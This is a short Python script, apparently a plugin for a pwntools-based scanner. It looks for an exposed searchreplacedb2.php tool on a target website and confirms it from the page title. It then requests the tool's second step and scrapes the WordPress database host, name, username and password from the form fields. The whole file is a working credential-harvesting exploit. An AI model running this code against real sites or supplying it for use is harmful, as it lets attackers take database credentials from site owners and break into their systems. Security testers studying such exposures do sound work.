import urllib,urllib2
import traceback
from pwn import *
from Convention import *

def passive(url):
	url += "searchreplacedb2.php"
	c = Convention()
	html = ""
	retvalue = [("none",False)]
	try:
		response = urllib2.urlopen(url)	
		html = response.read()
		log.info('May have found searchreplacedb2.php')
		if "<title>Search and replace DB.</title>" in html:
			log.success('Confirmed! Search&Replace is at '+url)
			retvalue = []
			values = {'loadwp':1}
			data = urllib.urlencode(values)
			url += "?step=2"
			response = urllib2.urlopen(url,data)
			html = response.read()
			#print html
			html = html.split('\n')
			for line in html:
				if line.find('name="host"') != -1:
					retvalue.append((c.DB_Host,line.split('"')[9]))
				if line.find('name="data"') != -1:
					retvalue.append((c.DB_Name,line.split('"')[9]))
				if line.find('name="user"') != -1:
					retvalue.append((c.DB_User,line.split('"')[9]))
				if line.find('name="pass"') != -1:
					retvalue.append((c.DB_Password,line.split('"')[9]))
	except:
		traceback.print_exc()
		pass
	return retvalue

def active(url):
	return passive(url)
